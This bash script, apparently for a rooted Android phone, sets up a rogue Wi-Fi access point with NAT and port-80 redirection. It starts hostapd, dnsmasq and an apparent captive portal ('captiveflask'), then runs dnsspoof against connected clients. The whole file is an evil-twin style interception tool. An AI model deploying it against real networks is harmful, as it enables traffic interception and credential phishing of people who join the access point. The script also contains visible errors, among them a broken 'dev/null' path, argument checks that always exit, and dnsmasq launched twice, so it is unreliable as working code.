#!/usr/bin/env bash
if [ "$EUID" -ne 0 ]; then
	echo "Run it as root"
	exit 1
fi
if [ -z "$1" ]; then
	echo "No interface passed: using default wlan1"
	wi_int="wlan1"
else
	echo "$1" | grep -E "^wlan[0-9]{1,2}" > dev/null || echo "Unknown interface: $1" && exit 1
	wi_int="$1"
fi
if [ -z "$2" ]; then
	echo "No AP interface passed: using default wlan0"
	ap_int="wlan0"
else
        echo "$2" | grep -E "^wlan[0-9]{1,2}" > dev/null || echo "Unknown interface: $2" && exit 1
        ap_int="$2"
fi
echo "Checking default rule number..."
for table in "$(ip rule list | awk -F"lookup" '{print $2}')"; do
	DEF=`ip route show table $table | grep default | grep rmnet_data2`
	if [ ! -z "$DEF" ]; then
		break
	fi
done
echo "Default rule number is $table"
echo "Checking for existing $wi_int interface..."
if ip link show $wi_int; then
	echo "$wi_int exists, continuing.."
else
	if [[ `iw list | grep '* AP'` == *"* AP"* ]]; then
    		echo "$ap_int supports AP mode, creating AP interface.."
		iw dev $ap_int interface add $wi_int type __ap
		ip addr flush $wi_int
		ip addr flush $wi_int
		ip link set up dev $wi_int
	else
		echo "$ap_int doesn't support AP mode, exiting.."
		exit 1
	fi
fi
echo "Adding iptables for internet sharing..."
iptables --flush

ifconfig $wi_int up 10.0.0.1 netmask 255.255.255.0
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1

iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 80
iptables --table nat --append POSTROUTING --out-interface rmnet_data2 -j MASQUERADE
iptables --append FORWARD --in-interface $wi_int -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward

ip rule add from all lookup main pref 1 2> /dev/null
ip rule add from all iif lo oif $wi_int uidrange 0-0 lookup 97 pref 11000 2> /dev/null
ip rule add from all iif lo oif rmnet_data2 lookup $table pref 17000 2> /dev/null
ip rule add from all iif lo oif $wi_int lookup 97 pref 17000 2> /dev/null
ip rule add from all iif $wi_int lookup $table pref 21000 2> /dev/null
echo "Starting captiveflask and hostapd..."
if [ -f "$(pwd)/hostapd.conf" ]; then
	hostapd hostapd.conf &
else
	echo "hostapd.conf not found in $(pwd)"
	exit 1
fi
sleep 5
if [ -f "$(pwd)/dnsmasq.conf" ]; then
	dnsmasq -C dnsmasq.conf -d &
else
	hostapd_pid="$(ps aux | grep hostapd | grep -v grep | awk '{print $2}')"
	echo "dnsmasq.conf not found in $(pwd)"
	kill $hostapd_pid
	exit 1
fi
sleep 5
dnsmasq -C dnsmasq.conf &
nohup dnsspoof -i $wi_int
